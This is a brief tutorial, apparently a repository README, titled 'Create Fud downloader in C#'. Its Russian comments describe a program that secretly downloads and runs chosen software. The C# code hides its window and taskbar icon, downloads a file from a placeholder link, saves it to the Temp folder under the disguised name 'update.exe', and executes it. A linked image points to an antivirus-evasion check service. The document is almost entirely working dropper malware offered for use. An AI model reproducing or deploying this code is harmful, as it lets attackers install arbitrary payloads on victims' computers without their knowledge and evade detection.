# Create Fud downloader in C#

### Функционал

В скрытом режиме скачивает и запускает нужное ПО

```C#
//Скрываем форму
            this.Hide();
            ShowIcon = false;
            ShowInTaskbar = false;
            Opacity = 0;

            byte[] srv = null; // создадим переменную для хранения файла
            try
            {
                using (WebClient web = new WebClient())
                {
                    srv = web.DownloadData("[ссылка на наш файл]"); // скачиваем файл
                }
            
                File.WriteAllBytes(Path.GetTempPath() + "\\update.exe", srv); // записываем в Temp
                Thread.Sleep(3000); // небольшая пауза на всякий случай
                Process.Start(Path.GetTempPath() + "\\update.exe"); // запускаем
                Application.Exit(); // выходим
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message); // сообщение если ошибка
}
```

![](https://viruscheckmate.com/image/b7mSkcZ25v3V/full/img.png)
